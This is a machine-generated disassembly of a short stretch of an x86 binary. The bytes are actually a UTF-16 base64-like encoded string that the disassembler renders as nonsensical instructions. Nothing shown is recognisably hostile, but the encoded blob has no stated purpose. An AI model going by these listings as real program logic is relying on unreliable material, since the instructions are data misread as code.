  4067c0:	00 71 00             	add    %dh,0x0(%ecx)
  4067c3:	65 00 39             	add    %bh,%gs:(%ecx)
  4067c6:	00 62 00             	add    %ah,0x0(%edx)
  4067c9:	50                   	push   %eax
  4067ca:	00 37                	add    %dh,(%edi)
  4067cc:	00 62 00             	add    %ah,0x0(%edx)
  4067cf:	77 00                	ja     0x4067d1
  4067d1:	2f                   	das
  4067d2:	00 53 00             	add    %dl,0x0(%ebx)
  4067d5:	5a                   	pop    %edx
  4067d6:	00 49 00             	add    %cl,0x0(%ecx)
  4067d9:	34 00                	xor    $0x0,%al
  4067db:	4b                   	dec    %ebx
  4067dc:	00 44 00 7a          	add    %al,0x7a(%eax,%eax,1)
  4067e0:	00 5a 00             	add    %bl,0x0(%edx)
  4067e3:	47                   	inc    %edi
  4067e4:	00 35 00 4a 00 36    	add    %dh,0x36004a00
  4067ea:	00 4a 00             	add    %cl,0x0(%edx)
  4067ed:	72 00                	jb     0x4067ef
  4067ef:	62 00                	bound  %eax,(%eax)
  4067f1:	32 00                	xor    (%eax),%al
  4067f3:	6a 00                	push   $0x0
  4067f5:	5a                   	pop    %edx
  4067f6:	00 76 00             	add    %dh,0x0(%esi)
  4067f9:	61                   	popa
  4067fa:	00 71 00             	add    %dh,0x0(%ecx)
  4067fd:	74 00                	je     0x4067ff
  4067ff:	54                   	push   %esp
  406800:	00 65 00             	add    %ah,0x0(%ebp)
  406803:	55                   	push   %ebp
  406804:	00 54 00 68          	add    %dl,0x68(%eax,%eax,1)
  406808:	00 73 00             	add    %dh,0x0(%ebx)
  40680b:	36 00 34 00          	add    %dh,%ss:(%eax,%eax,1)
  40680f:	4f                   	dec    %edi
  406810:	00 2f                	add    %ch,(%edi)
  406812:	00 39                	add    %bh,(%ecx)
  406814:	00 46 00             	add    %al,0x0(%esi)
  406817:	33 00                	xor    (%eax),%eax
  406819:	43                   	inc    %ebx
  40681a:	00 37                	add    %dh,(%edi)
  40681c:	00 4f 00             	add    %cl,0x0(%edi)
  40681f:	66 00 65 00          	data16 add %ah,0x0(%ebp)
  406823:	45                   	inc    %ebp
  406824:	00 52 00             	add    %dl,0x0(%edx)
  406827:	70 00                	jo     0x406829
  406829:	53                   	push   %ebx
  40682a:	00 7a 00             	add    %bh,0x0(%edx)
  40682d:	63 00                	arpl   %eax,(%eax)
  40682f:	76 00                	jbe    0x406831
  406831:	55                   	push   %ebp
  406832:	00 70 00             	add    %dh,0x0(%eax)
  406835:	34 00                	xor    $0x0,%al
  406837:	73 00                	jae    0x406839
  406839:	56                   	push   %esi
  40683a:	00 6a 00             	add    %ch,0x0(%edx)
  40683d:	4b                   	dec    %ebx
  40683e:	00 66 00             	add    %ah,0x0(%esi)
  406841:	4c                   	dec    %esp
  406842:	00 31                	add    %dh,(%ecx)
  406844:	00 72 00             	add    %dh,0x0(%edx)
  406847:	76 00                	jbe    0x406849
  406849:	61                   	popa
  40684a:	00 4e 00             	add    %cl,0x0(%esi)
  40684d:	56                   	push   %esi
  40684e:	00 59 00             	add    %bl,0x0(%ecx)
  406851:	31 00                	xor    %eax,(%eax)
  406853:	74 00                	je     0x406855
  406855:	47                   	inc    %edi
  406856:	00 53 00             	add    %dl,0x0(%ebx)
  406859:	61                   	popa
  40685a:	00 44 00 70          	add    %al,0x70(%eax,%eax,1)
  40685e:	00 69 00             	add    %ch,0x0(%ecx)
  406861:	76 00                	jbe    0x406863
  406863:	72 00                	jb     0x406865
  406865:	31 00                	xor    %eax,(%eax)
  406867:	54                   	push   %esp
  406868:	00 4c 00 76          	add    %cl,0x76(%eax,%eax,1)
  40686c:	00 43 00             	add    %al,0x0(%ebx)
  40686f:	78 00                	js     0x406871
  406871:	39 00                	cmp    %eax,(%eax)
  406873:	75 00                	jne    0x406875
  406875:	56                   	push   %esi
  406876:	00 33                	add    %dh,(%ebx)
  406878:	00 76 00             	add    %dh,0x0(%esi)
  40687b:	57                   	push   %edi
  40687c:	00 7a 00             	add    %bh,0x0(%edx)
  40687f:	79 00                	jns    0x406881
  406881:	45                   	inc    %ebp
  406882:	00 64 00 6b          	add    %ah,0x6b(%eax,%eax,1)
  406886:	00 70 00             	add    %dh,0x0(%eax)
  406889:	31 00                	xor    %eax,(%eax)
  40688b:	6d                   	insl   (%dx),%es:(%edi)
  40688c:	00 47 00             	add    %al,0x0(%edi)
  40688f:	4e                   	dec    %esi
  406890:	00 6c 00 36          	add    %ch,0x36(%eax,%eax,1)
  406894:	00 72 00             	add    %dh,0x0(%edx)
  406897:	47                   	inc    %edi
  406898:	00 37                	add    %dh,(%edi)
  40689a:	00 54 00 4c          	add    %dl,0x4c(%eax,%eax,1)
  40689e:	00 75 00             	add    %dh,0x0(%ebp)
  4068a1:	42                   	inc    %edx
  4068a2:	00 4c 00 5a          	add    %cl,0x5a(%eax,%eax,1)
  4068a6:	00 38                	add    %bh,(%eax)
  4068a8:	00 73 00             	add    %dh,0x0(%ebx)
  4068ab:	35 00 6c 00 52       	xor    $0x52006c00,%eax
  4068b0:	00 53 00             	add    %dl,0x0(%ebx)
  4068b3:	47                   	inc    %edi
  4068b4:	00 69 00             	add    %ch,0x0(%ecx)
  4068b7:	33 00                	xor    (%eax),%eax
  4068b9:	72 00                	jb     0x4068bb
  4068bb:	4c                   	dec    %esp
  4068bc:	00 67 00             	add    %ah,0x0(%edi)
  4068bf:	65 00 31             	add    %dh,%gs:(%ecx)
  4068c2:	00 36                	add    %dh,(%esi)
  4068c4:	00 31                	add    %dh,(%ecx)
  4068c6:	00 2f                	add    %ch,(%edi)
  4068c8:	00 68 00             	add    %ch,0x0(%eax)
  4068cb:	51                   	push   %ecx
  4068cc:	00 30                	add    %dh,(%eax)
  4068ce:	00 7a 00             	add    %bh,0x0(%edx)
  4068d1:	72 00                	jb     0x4068d3
  4068d3:	51                   	push   %ecx
  4068d4:	00 50 00             	add    %dl,0x0(%eax)
  4068d7:	77 00                	ja     0x4068d9
  4068d9:	77 00                	ja     0x4068db
  4068db:	78 00                	js     0x4068dd
  4068dd:	30 00                	xor    %al,(%eax)
  4068df:	76 00                	jbe    0x4068e1
  4068e1:	36 00 4f 00          	add    %cl,%ss:0x0(%edi)
  4068e5:	35 00 32 00 74       	xor    $0x74003200,%eax
  4068ea:	00 34 00             	add    %dh,(%eax,%eax,1)
  4068ed:	59                   	pop    %ecx
  4068ee:	00 67 00             	add    %ah,0x0(%edi)
  4068f1:	6b 00 61             	imul   $0x61,(%eax),%eax
  4068f4:	00 33                	add    %dh,(%ebx)
  4068f6:	00 41 00             	add    %al,0x0(%ecx)
  4068f9:	38 00                	cmp    %al,(%eax)
  4068fb:	4c                   	dec    %esp
  4068fc:	00 50 00             	add    %dl,0x0(%eax)
  4068ff:	58                   	pop    %eax
  406900:	00 79 00             	add    %bh,0x0(%ecx)
  406903:	58                   	pop    %eax
  406904:	00 47 00             	add    %al,0x0(%edi)
  406907:	64 00 64 00 66       	add    %ah,%fs:0x66(%eax,%eax,1)
  40690c:	00 41 00             	add    %al,0x0(%ecx)
  40690f:	42                   	inc    %edx
  406910:	00 57 00             	add    %dl,0x0(%edi)
  406913:	66 00 50 00          	data16 add %dl,0x0(%eax)
  406917:	75 00                	jne    0x406919
  406919:	76 00                	jbe    0x40691b
  40691b:	4b                   	dec    %ebx
  40691c:	00 69 00             	add    %ch,0x0(%ecx)
  40691f:	77 00                	ja     0x406921
  406921:	7a 00                	jp     0x406923
  406923:	2f                   	das
  406924:	00 66 00             	add    %ah,0x0(%esi)
  406927:	73 00                	jae    0x406929
  406929:	77 00                	ja     0x40692b
  40692b:	36 00 4e 00          	add    %cl,%ss:0x0(%esi)
  40692f:	38 00                	cmp    %al,(%eax)
  406931:	32 00                	xor    (%eax),%al
  406933:	34 00                	xor    $0x0,%al
  406935:	44                   	inc    %esp
  406936:	00 4c 00 33          	add    %cl,0x33(%eax,%eax,1)
  40693a:	00 39                	add    %bh,(%ecx)
  40693c:	00 67 00             	add    %ah,0x0(%edi)
  40693f:	6b 00 78             	imul   $0x78,(%eax),%eax
  406942:	00 48 00             	add    %cl,0x0(%eax)
  406945:	46                   	inc    %esi
  406946:	00 74 00 37          	add    %dh,0x37(%eax,%eax,1)
  40694a:	00 31                	add    %dh,(%ecx)
  40694c:	00 71 00             	add    %dh,0x0(%ecx)
  40694f:	59                   	pop    %ecx
  406950:	00 6e 00             	add    %ch,0x0(%esi)
  406953:	56                   	push   %esi
  406954:	00 74 00 48          	add    %dh,0x48(%eax,%eax,1)
  406958:	00 6e 00             	add    %ch,0x0(%esi)
  40695b:	37                   	aaa
  40695c:	00 36                	add    %dh,(%esi)
  40695e:	00 35 00 4d 00 2f    	add    %dh,0x2f004d00
  406964:	00 31                	add    %dh,(%ecx)
  406966:	00 38                	add    %bh,(%eax)
  406968:	00 41 00             	add    %al,0x0(%ecx)
  40696b:	44                   	inc    %esp
  40696c:	00 55 00             	add    %dl,0x0(%ebp)
  40696f:	69 00 61 00 30 00    	imul   $0x300061,(%eax),%eax
  406975:	57                   	push   %edi
  406976:	00 38                	add    %bh,(%eax)
  406978:	00 43 00             	add    %al,0x0(%ebx)
  40697b:	55                   	push   %ebp
  40697c:	00 73 00             	add    %dh,0x0(%ebx)
  40697f:	6c                   	insb   (%dx),%es:(%edi)
  406980:	00 48 00             	add    %cl,0x0(%eax)
  406983:	65 00 44 00 38       	add    %al,%gs:0x38(%eax,%eax,1)
  406988:	00 52 00             	add    %dl,0x0(%edx)
  40698b:	4a                   	dec    %edx
  40698c:	00 7a 00             	add    %bh,0x0(%edx)
  40698f:	4a                   	dec    %edx
  406990:	00 36                	add    %dh,(%esi)
  406992:	00 77 00             	add    %dh,0x0(%edi)
  406995:	4e                   	dec    %esi
  406996:	00 43 00             	add    %al,0x0(%ebx)
  406999:	6b 00 74             	imul   $0x74,(%eax),%eax
  40699c:	00 35 00 4a 00 59    	add    %dh,0x59004a00
  4069a2:	00 46 00             	add    %al,0x0(%esi)
  4069a5:	73 00                	jae    0x4069a7
  4069a7:	31 00                	xor    %eax,(%eax)
  4069a9:	59                   	pop    %ecx
  4069aa:	00 68 00             	add    %ch,0x0(%eax)
  4069ad:	32 00                	xor    (%eax),%al
  4069af:	6e                   	outsb  %ds:(%esi),(%dx)
  4069b0:	00 75 00             	add    %dh,0x0(%ebp)
  4069b3:	67 00 35             	add    %dh,(%di)
  4069b6:	00 79 00             	add    %bh,0x0(%ecx)
  4069b9:	56                   	push   %esi
  4069ba:	00 63 00             	add    %ah,0x0(%ebx)
  4069bd:	4a                   	dec    %edx
  4069be:	00 57 00             	add    %dl,0x0(%edi)
  4069c1:	61                   	popa
  4069c2:	00 4f 00             	add    %cl,0x0(%edi)
  4069c5:	4d                   	dec    %ebp
  4069c6:	00 70 00             	add    %dh,0x0(%eax)
  4069c9:	57                   	push   %edi
  4069ca:	00 64 00 6e          	add    %ah,0x6e(%eax,%eax,1)
  4069ce:	00 6f 00             	add    %ch,0x0(%edi)
  4069d1:	2f                   	das
  4069d2:	00 39                	add    %bh,(%ecx)
  4069d4:	00 76 00             	add    %dh,0x0(%esi)
  4069d7:	45                   	inc    %ebp
  4069d8:	00 43 00             	add    %al,0x0(%ebx)
  4069db:	33 00                	xor    (%eax),%eax
  4069dd:	55                   	push   %ebp
  4069de:	00 32                	add    %dh,(%edx)
  4069e0:	00 75 00             	add    %dh,0x0(%ebp)
  4069e3:	7a 00                	jp     0x4069e5
  4069e5:	69 00 36 00 37 00    	imul   $0x370036,(%eax),%eax
  4069eb:	4f                   	dec    %edi
  4069ec:	00 51 00             	add    %dl,0x0(%ecx)
  4069ef:	39 00                	cmp    %eax,(%eax)
  4069f1:	4c                   	dec    %esp
  4069f2:	00 6f 00             	add    %ch,0x0(%edi)
  4069f5:	2b 00                	sub    (%eax),%eax
  4069f7:	35 00 56 00 39       	xor    $0x39005600,%eax
  4069fc:	00 57 00             	add    %dl,0x0(%edi)
  4069ff:	4d                   	dec    %ebp
  406a00:	00 46 00             	add    %al,0x0(%esi)
  406a03:	50                   	push   %eax
  406a04:	00 34 00             	add    %dh,(%eax,%eax,1)
  406a07:	49                   	dec    %ecx
  406a08:	00 6b 00             	add    %ch,0x0(%ebx)
  406a0b:	2b 00                	sub    (%eax),%eax
  406a0d:	6a 00                	push   $0x0
  406a0f:	2f                   	das
  406a10:	00 2b                	add    %ch,(%ebx)
  406a12:	00 68 00             	add    %ch,0x0(%eax)
  406a15:	79 00                	jns    0x406a17
  406a17:	6d                   	insl   (%dx),%es:(%edi)
  406a18:	00 6f 00             	add    %ch,0x0(%edi)
  406a1b:	36 00 41 00          	add    %al,%ss:0x0(%ecx)
  406a1f:	51                   	push   %ecx
  406a20:	00 2b                	add    %ch,(%ebx)
  406a22:	00 58 00             	add    %bl,0x0(%eax)
  406a25:	62 00                	bound  %eax,(%eax)
  406a27:	4d                   	dec    %ebp
  406a28:	00 49 00             	add    %cl,0x0(%ecx)
  406a2b:	35 00 37 00 42       	xor    $0x42003700,%eax
  406a30:	00 33                	add    %dh,(%ebx)
  406a32:	00 63 00             	add    %ah,0x0(%ebx)
  406a35:	35 00 6c 00 31       	xor    $0x31006c00,%eax
  406a3a:	00 57 00             	add    %dl,0x0(%edi)
  406a3d:	31 00                	xor    %eax,(%eax)
  406a3f:	70 00                	jo     0x406a41
  406a41:	6f                   	outsl  %ds:(%esi),(%dx)
  406a42:	00 45 00             	add    %al,0x0(%ebp)
  406a45:	79 00                	jns    0x406a47
  406a47:	57                   	push   %edi
  406a48:	00 4a 00             	add    %cl,0x0(%edx)
  406a4b:	68 00 74 00 5a       	push   $0x5a007400
  406a50:	00 52 00             	add    %dl,0x0(%edx)
  406a53:	59                   	pop    %ecx
  406a54:	00 7a 00             	add    %bh,0x0(%edx)
  406a57:	7a 00                	jp     0x406a59
  406a59:	33 00                	xor    (%eax),%eax
  406a5b:	41                   	inc    %ecx
  406a5c:	00 4b 00             	add    %cl,0x0(%ebx)
  406a5f:	6f                   	outsl  %ds:(%esi),(%dx)
  406a60:	00 61 00             	add    %ah,0x0(%ecx)
  406a63:	30 00                	xor    %al,(%eax)
  406a65:	76 00                	jbe    0x406a67
  406a67:	75 00                	jne    0x406a69
  406a69:	44                   	inc    %esp
  406a6a:	00 76 00             	add    %dh,0x0(%esi)
  406a6d:	30 00                	xor    %al,(%eax)
  406a6f:	50                   	push   %eax
  406a70:	00 47 00             	add    %al,0x0(%edi)
  406a73:	76 00                	jbe    0x406a75
  406a75:	6d                   	insl   (%dx),%es:(%edi)
  406a76:	00 74 00 42          	add    %dh,0x42(%eax,%eax,1)
  406a7a:	00 4f 00             	add    %cl,0x0(%edi)
  406a7d:	70 00                	jo     0x406a7f
  406a7f:	4d                   	dec    %ebp
  406a80:	00 33                	add    %dh,(%ebx)
  406a82:	00 79 00             	add    %bh,0x0(%ecx)
  406a85:	6c                   	insb   (%dx),%es:(%edi)
  406a86:	00 78 00             	add    %bh,0x0(%eax)
  406a89:	30 00                	xor    %al,(%eax)
  406a8b:	6b 00 76             	imul   $0x76,(%eax),%eax
  406a8e:	00 48 00             	add    %cl,0x0(%eax)
  406a91:	79 00                	jns    0x406a93
  406a93:	43                   	inc    %ebx
  406a94:	00 58 00             	add    %bl,0x0(%eax)
  406a97:	65 00 70 00          	add    %dh,%gs:0x0(%eax)
  406a9b:	72 00                	jb     0x406a9d
  406a9d:	70 00                	jo     0x406a9f
  406a9f:	37                   	aaa
  406aa0:	00 72 00             	add    %dh,0x0(%edx)
  406aa3:	56                   	push   %esi
  406aa4:	00 4f 00             	add    %cl,0x0(%edi)
  406aa7:	7a 00                	jp     0x406aa9
  406aa9:	33 00                	xor    (%eax),%eax
  406aab:	68 00 71 00 56       	push   $0x56007100
  406ab0:	00 41 00             	add    %al,0x0(%ecx)
  406ab3:	73 00                	jae    0x406ab5
  406ab5:	44                   	inc    %esp
  406ab6:	00 43 00             	add    %al,0x0(%ebx)
  406ab9:	76 00                	jbe    0x406abb
  406abb:	34 00                	xor    $0x0,%al
  406abd:	33 00                	xor    (%eax),%eax
  406abf:	63 00                	arpl   %eax,(%eax)
  406ac1:	70 00                	jo     0x406ac3
  406ac3:	6d                   	insl   (%dx),%es:(%edi)
  406ac4:	00 76 00             	add    %dh,0x0(%esi)
  406ac7:	45                   	inc    %ebp
  406ac8:	00 53 00             	add    %dl,0x0(%ebx)
  406acb:	53                   	push   %ebx
  406acc:	00 30                	add    %dh,(%eax)
  406ace:	00 55 00             	add    %dl,0x0(%ebp)
  406ad1:	35 00 4d 00 77       	xor    $0x77004d00,%eax
  406ad6:	00 51 00             	add    %dl,0x0(%ecx)
  406ad9:	30 00                	xor    %al,(%eax)
  406adb:	61                   	popa
  406adc:	00 4d 00             	add    %cl,0x0(%ebp)
  406adf:	66 00 4e 00          	data16 add %cl,0x0(%esi)
  406ae3:	37                   	aaa
  406ae4:	00 41 00             	add    %al,0x0(%ecx)
  406ae7:	44                   	inc    %esp
  406ae8:	00 35 00 56 00 4d    	add    %dh,0x4d005600
  406aee:	00 59 00             	add    %bl,0x0(%ecx)
  406af1:	69 00 4d 00 6b 00    	imul   $0x6b004d,(%eax),%eax
  406af7:	41                   	inc    %ecx
  406af8:	00 52 00             	add    %dl,0x0(%edx)
  406afb:	68 00 4d 00 58       	push   $0x58004d00
  406b00:	00 75 00             	add    %dh,0x0(%ebp)
  406b03:	6b 00 65             	imul   $0x65,(%eax),%eax
  406b06:	00 56 00             	add    %dl,0x0(%esi)
  406b09:	6d                   	insl   (%dx),%es:(%edi)
  406b0a:	00 30                	add    %dh,(%eax)
  406b0c:	00 58 00             	add    %bl,0x0(%eax)
  406b0f:	6b 00 61             	imul   $0x61,(%eax),%eax
  406b12:	00 68 00             	add    %ch,0x0(%eax)
  406b15:	37                   	aaa
  406b16:	00 63 00             	add    %ah,0x0(%ebx)
  406b19:	45                   	inc    %ebp
  406b1a:	00 37                	add    %dh,(%edi)
  406b1c:	00 4a 00             	add    %cl,0x0(%edx)
  406b1f:	6a 00                	push   $0x0
  406b21:	53                   	push   %ebx
  406b22:	00 76 00             	add    %dh,0x0(%esi)
  406b25:	72 00                	jb     0x406b27
  406b27:	4f                   	dec    %edi
  406b28:	00 52 00             	add    %dl,0x0(%edx)
  406b2b:	44                   	inc    %esp
  406b2c:	00 48 00             	add    %cl,0x0(%eax)
  406b2f:	5a                   	pop    %edx
  406b30:	00 51 00             	add    %dl,0x0(%ecx)
  406b33:	68 00 55 00 31       	push   $0x31005500
  406b38:	00 37                	add    %dh,(%edi)
  406b3a:	00 4e 00             	add    %cl,0x0(%esi)
  406b3d:	46                   	inc    %esi
  406b3e:	00 67 00             	add    %ah,0x0(%edi)
  406b41:	4e                   	dec    %esi
  406b42:	00 69 00             	add    %ch,0x0(%ecx)
  406b45:	46                   	inc    %esi
  406b46:	00 58 00             	add    %bl,0x0(%eax)
  406b49:	61                   	popa
  406b4a:	00 45 00             	add    %al,0x0(%ebp)
  406b4d:	6b 00 47             	imul   $0x47,(%eax),%eax
  406b50:	00 65 00             	add    %ah,0x0(%ebp)
  406b53:	7a 00                	jp     0x406b55
  406b55:	39 00                	cmp    %eax,(%eax)
  406b57:	6d                   	insl   (%dx),%es:(%edi)
  406b58:	00 46 00             	add    %al,0x0(%esi)
  406b5b:	70 00                	jo     0x406b5d
  406b5d:	30 00                	xor    %al,(%eax)
  406b5f:	38 00                	cmp    %al,(%eax)
  406b61:	77 00                	ja     0x406b63
  406b63:	55                   	push   %ebp
  406b64:	00 67 00             	add    %ah,0x0(%edi)
  406b67:	30 00                	xor    %al,(%eax)
  406b69:	67 00 31             	add    %dh,(%bx,%di)
  406b6c:	00 58 00             	add    %bl,0x0(%eax)
  406b6f:	6a 00                	push   $0x0
  406b71:	74 00                	je     0x406b73
  406b73:	48                   	dec    %eax
  406b74:	00 6f 00             	add    %ch,0x0(%edi)
  406b77:	62 00                	bound  %eax,(%eax)
  406b79:	6d                   	insl   (%dx),%es:(%edi)
  406b7a:	00 38                	add    %bh,(%eax)
  406b7c:	00 69 00             	add    %ch,0x0(%ecx)
  406b7f:	58                   	pop    %eax
  406b80:	00 78 00             	add    %bh,0x0(%eax)
  406b83:	39 00                	cmp    %eax,(%eax)
  406b85:	66 00 34 00          	data16 add %dh,(%eax,%eax,1)
  406b89:	7a 00                	jp     0x406b8b
  406b8b:	4b                   	dec    %ebx
  406b8c:	00 5a 00             	add    %bl,0x0(%edx)
  406b8f:	4e                   	dec    %esi
  406b90:	00 69 00             	add    %ch,0x0(%ecx)
  406b93:	6c                   	insb   (%dx),%es:(%edi)
  406b94:	00 64 00 5a          	add    %ah,0x5a(%eax,%eax,1)
  406b98:	00 56 00             	add    %dl,0x0(%esi)
  406b9b:	73 00                	jae    0x406b9d
  406b9d:	30 00                	xor    %al,(%eax)
  406b9f:	30 00                	xor    %al,(%eax)
  406ba1:	47                   	inc    %edi
  406ba2:	00 59 00             	add    %bl,0x0(%ecx)
  406ba5:	46                   	inc    %esi
  406ba6:	00 34 00             	add    %dh,(%eax,%eax,1)
  406ba9:	54                   	push   %esp
  406baa:	00 6d 00             	add    %ch,0x0(%ebp)
  406bad:	56                   	push   %esi
  406bae:	00 44 00 38          	add    %al,0x38(%eax,%eax,1)
  406bb2:	00 34 00             	add    %dh,(%eax,%eax,1)
  406bb5:	57                   	push   %edi
  406bb6:	00 63 00             	add    %ah,0x0(%ebx)
  406bb9:	49                   	dec    %ecx
  406bba:	00 65 00             	add    %ah,0x0(%ebp)
  406bbd:	47                   	inc    %edi
  406bbe:	00 73 00             	add    %dh,0x0(%ebx)
  406bc1:	33 00                	xor    (%eax),%eax
  406bc3:	57                   	push   %edi
  406bc4:	00 47 00             	add    %al,0x0(%edi)
  406bc7:	2f                   	das
  406bc8:	00 42 00             	add    %al,0x0(%edx)
  406bcb:	36 00 41 00          	add    %al,%ss:0x0(%ecx)
  406bcf:	52                   	push   %edx
  406bd0:	00 74 00 77          	add    %dh,0x77(%eax,%eax,1)
  406bd4:	00 36                	add    %dh,(%esi)
  406bd6:	00 6a 00             	add    %ch,0x0(%edx)
  406bd9:	46                   	inc    %esi
  406bda:	00 4f 00             	add    %cl,0x0(%edi)
  406bdd:	35 00 6a 00 62       	xor    $0x62006a00,%eax
  406be2:	00 50 00             	add    %dl,0x0(%eax)
  406be5:	4b                   	dec    %ebx
  406be6:	00 66 00             	add    %ah,0x0(%esi)
  406be9:	77 00                	ja     0x406beb
  406beb:	61                   	popa
  406bec:	00 51 00             	add    %dl,0x0(%ecx)
  406bef:	4a                   	dec    %edx
  406bf0:	00 76 00             	add    %dh,0x0(%esi)
  406bf3:	77 00                	ja     0x406bf5
  406bf5:	2b 00                	sub    (%eax),%eax
  406bf7:	45                   	inc    %ebp
  406bf8:	00 56 00             	add    %dl,0x0(%esi)
  406bfb:	34 00                	xor    $0x0,%al
  406bfd:	7a 00                	jp     0x406bff
  406bff:	68 00 76 00 58       	push   $0x58007600
  406c04:	00 50 00             	add    %dl,0x0(%eax)
  406c07:	6c                   	insb   (%dx),%es:(%edi)
  406c08:	00 70 00             	add    %dh,0x0(%eax)
  406c0b:	42                   	inc    %edx
  406c0c:	00 74 00 36          	add    %dh,0x36(%eax,%eax,1)
  406c10:	00 47 00             	add    %al,0x0(%edi)
  406c13:	36 00 63 00          	add    %ah,%ss:0x0(%ebx)
  406c17:	41                   	inc    %ecx
  406c18:	00 54 00 6b          	add    %dl,0x6b(%eax,%eax,1)
  406c1c:	00 37                	add    %dh,(%edi)
  406c1e:	00 2b                	add    %ch,(%ebx)
  406c20:	00 4a 00             	add    %cl,0x0(%edx)
  406c23:	65 00 4c 00 41       	add    %cl,%gs:0x41(%eax,%eax,1)
  406c28:	00 77 00             	add    %dh,0x0(%edi)
  406c2b:	77 00                	ja     0x406c2d
  406c2d:	66 00 61 00          	data16 add %ah,0x0(%ecx)
  406c31:	53                   	push   %ebx
  406c32:	00 50 00             	add    %dl,0x0(%eax)
  406c35:	44                   	inc    %esp
  406c36:	00 49 00             	add    %cl,0x0(%ecx)
  406c39:	62 00                	bound  %eax,(%eax)
  406c3b:	65 00 45 00          	add    %al,%gs:0x0(%ebp)
  406c3f:	4e                   	dec    %esi
  406c40:	00 79 00             	add    %bh,0x0(%ecx)
  406c43:	50                   	push   %eax
  406c44:	00 72 00             	add    %dh,0x0(%edx)
  406c47:	49                   	dec    %ecx
  406c48:	00 4d 00             	add    %cl,0x0(%ebp)
  406c4b:	56                   	push   %esi
  406c4c:	00 62 00             	add    %ah,0x0(%edx)
  406c4f:	51                   	push   %ecx
  406c50:	00 6b 00             	add    %ch,0x0(%ebx)
  406c53:	52                   	push   %edx
  406c54:	00 55 00             	add    %dl,0x0(%ebp)
  406c57:	4c                   	dec    %esp
  406c58:	00 31                	add    %dh,(%ecx)
  406c5a:	00 75 00             	add    %dh,0x0(%ebp)
  406c5d:	48                   	dec    %eax
  406c5e:	00 6b 00             	add    %ch,0x0(%ebx)
  406c61:	38 00                	cmp    %al,(%eax)
  406c63:	33 00                	xor    (%eax),%eax
  406c65:	56                   	push   %esi
  406c66:	00 73 00             	add    %dh,0x0(%ebx)
  406c69:	66 00 42 00          	data16 add %al,0x0(%edx)
  406c6d:	78 00                	js     0x406c6f
  406c6f:	74 00                	je     0x406c71
  406c71:	2b 00                	sub    (%eax),%eax
  406c73:	6d                   	insl   (%dx),%es:(%edi)
  406c74:	00 4f 00             	add    %cl,0x0(%edi)
  406c77:	7a 00                	jp     0x406c79
  406c79:	38 00                	cmp    %al,(%eax)
  406c7b:	6f                   	outsl  %ds:(%esi),(%dx)
  406c7c:	00 5a 00             	add    %bl,0x0(%edx)
  406c7f:	4e                   	dec    %esi
  406c80:	00 4a 00             	add    %cl,0x0(%edx)
  406c83:	50                   	push   %eax
  406c84:	00 46 00             	add    %al,0x0(%esi)
  406c87:	36 00 7a 00          	add    %bh,%ss:0x0(%edx)
  406c8b:	45                   	inc    %ebp
  406c8c:	00 71 00             	add    %dh,0x0(%ecx)
  406c8f:	56                   	push   %esi
  406c90:	00 57 00             	add    %dl,0x0(%edi)
  406c93:	67 00 56 00          	add    %dl,0x0(%bp)
  406c97:	4c                   	dec    %esp
  406c98:	00 4a 00             	add    %cl,0x0(%edx)
  406c9b:	37                   	aaa
  406c9c:	00 6c 00 43          	add    %ch,0x43(%eax,%eax,1)
  406ca0:	00 58 00             	add    %bl,0x0(%eax)
  406ca3:	35 00 6b 00 6a       	xor    $0x6a006b00,%eax
  406ca8:	00 61 00             	add    %ah,0x0(%ecx)
  406cab:	76 00                	jbe    0x406cad
  406cad:	6c                   	insb   (%dx),%es:(%edi)
  406cae:	00 32                	add    %dh,(%edx)
  406cb0:	00 39                	add    %bh,(%ecx)
  406cb2:	00 6a 00             	add    %ch,0x0(%edx)
  406cb5:	71 00                	jno    0x406cb7
  406cb7:	42                   	inc    %edx
  406cb8:	00 55 00             	add    %dl,0x0(%ebp)
  406cbb:	52                   	push   %edx
  406cbc:	00 6f 00             	add    %ch,0x0(%edi)
  406cbf:	30 00                	xor    %al,(%eax)
  406cc1:	71 00                	jno    0x406cc3
  406cc3:	6a 00                	push   $0x0
  406cc5:	6b 00 64             	imul   $0x64,(%eax),%eax
  406cc8:	00 61 00             	add    %ah,0x0(%ecx)
  406ccb:	54                   	push   %esp
  406ccc:	00 35 00 53 00 31    	add    %dh,0x31005300
  406cd2:	00 6b 00             	add    %ch,0x0(%ebx)
  406cd5:	56                   	push   %esi
  406cd6:	00 4f 00             	add    %cl,0x0(%edi)
  406cd9:	6a 00                	push   $0x0
  406cdb:	49                   	dec    %ecx
  406cdc:	00 6a 00             	add    %ch,0x0(%edx)
  406cdf:	54                   	push   %esp
  406ce0:	00 62 00             	add    %ah,0x0(%edx)
  406ce3:	48                   	dec    %eax
  406ce4:	00 7a 00             	add    %bh,0x0(%edx)
  406ce7:	49                   	dec    %ecx
  406ce8:	00 4b 00             	add    %cl,0x0(%ebx)
  406ceb:	68 00 4a 00 73       	push   $0x73004a00
  406cf0:	00 6e 00             	add    %ch,0x0(%esi)
  406cf3:	41                   	inc    %ecx
  406cf4:	00 7a 00             	add    %bh,0x0(%edx)
  406cf7:	47                   	inc    %edi
  406cf8:	00 34 00             	add    %dh,(%eax,%eax,1)
  406cfb:	42                   	inc    %edx
  406cfc:	00 78 00             	add    %bh,0x0(%eax)
  406cff:	45                   	inc    %ebp
  406d00:	00 64 00 63          	add    %ah,0x63(%eax,%eax,1)
  406d04:	00 49 00             	add    %cl,0x0(%ecx)
  406d07:	33 00                	xor    (%eax),%eax
  406d09:	54                   	push   %esp
  406d0a:	00 79 00             	add    %bh,0x0(%ecx)
  406d0d:	54                   	push   %esp
  406d0e:	00 59 00             	add    %bl,0x0(%ecx)
  406d11:	69 00 6d 00 6b 00    	imul   $0x6b006d,(%eax),%eax
  406d17:	44                   	inc    %esp
  406d18:	00 6c 00 6a          	add    %ch,0x6a(%eax,%eax,1)
  406d1c:	00 43 00             	add    %al,0x0(%ebx)
  406d1f:	73 00                	jae    0x406d21
  406d21:	79 00                	jns    0x406d23
  406d23:	6a 00                	push   $0x0
  406d25:	67 00 33             	add    %dh,(%bp,%di)
  406d28:	00 78 00             	add    %bh,0x0(%eax)
  406d2b:	46                   	inc    %esi
  406d2c:	00 54 00 4a          	add    %dl,0x4a(%eax,%eax,1)
  406d30:	00 6c 00 47          	add    %ch,0x47(%eax,%eax,1)
  406d34:	00 51 00             	add    %dl,0x0(%ecx)
  406d37:	6d                   	insl   (%dx),%es:(%edi)
  406d38:	00 65 00             	add    %ah,0x0(%ebp)
  406d3b:	7a 00                	jp     0x406d3d
  406d3d:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  406d41:	74 00                	je     0x406d43
